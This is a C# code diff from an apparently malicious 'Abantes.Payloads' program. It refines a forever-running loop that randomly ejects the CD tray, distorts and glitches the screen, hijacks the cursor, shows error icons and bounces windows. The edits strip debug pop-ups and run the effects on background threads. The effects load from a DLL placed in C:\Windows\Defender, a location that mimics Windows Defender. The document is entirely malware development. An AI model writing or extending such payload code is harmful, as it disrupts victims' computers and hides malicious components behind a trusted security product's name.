@@ -21,7 +21,8 @@ namespace Abantes.Payloads
         static Random _random = new Random();
         public static void MainPayloadThread()
         {
-            while(true)
+            Thread cursoricon = new Thread(new ThreadStart(Anoying.CursorIcon));
+            while (true)
             {
                 switch (_random.Next(10))
                 {
@@ -36,8 +37,7 @@ namespace Abantes.Payloads
                     case 2:
                         if (_random.Next(100) > 50)
                         {
-                            Anoying.CursorIcon(96, 96);
-                            MessageBox.Show("Cursor Payload");
+                            cursoricon.Start();
                         }
                         else
                         {
@@ -45,10 +45,7 @@ namespace Abantes.Payloads
                         }
                         break;
                     case 3:
-                        //string extractPath = @"C:\Windows\Defender";
-                        //Others.StartProcess(extractPath + "\\CursorFollow.exe", "");
-                        Anoying.CursorIcon(96, 96);
-                        MessageBox.Show("Cursor Payload");
+                        cursoricon.Start();
                         break;
                     case 4:
                         if (_random.Next(100) > 50)
@@ -66,20 +63,22 @@ namespace Abantes.Payloads
                         break;
                     case 6:
                         Anoying.EjectCd();
-                        MessageBox.Show("CD Payload");
                         break;
                     case 7:
-                        Anoying.Screen_Screw();
+                        Thread screenscrew = new Thread(new ThreadStart(Anoying.Screen_Screw));
+                        screenscrew.Start();
                         break;
                     case 8:
-                        Anoying.Screen_Glitching();
+                        Thread screenglitch = new Thread(new ThreadStart(Anoying.Screen_Glitching));
+                        screenglitch.Start();
                         break;
                     case 9:
-                        Anoying.Display_Icons_Error();
+                        Thread helpicons = new Thread(new ThreadStart(Anoying.Display_Icons_Error));
+                        helpicons.Start();
                         break;
                     case 10:
-                        Anoying.CrazyBounce();
-                        MessageBox.Show("Bounce Payload");
+                        Thread crazybounce = new Thread(new ThreadStart(Anoying.CrazyBounce));
+                        crazybounce.Start();
                         break;
                 }
                 Thread.Sleep(8000);
@@ -116,7 +115,7 @@ namespace Abantes.Payloads
         [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Display_Icons_Error@Payloads@1@QAEXXZ")]
         public static extern void Display_Icons_Error();
         [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?CursorIcon@Payloads@1@QAEXXZ")]
-        public static extern void CursorIcon(float dpiX, float dpiY);
+        public static extern void CursorIcon();
         [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?CrazyBounce@Payloads@1@QAEXXZ")]
         public static extern void CrazyBounce();
         static Point Position;
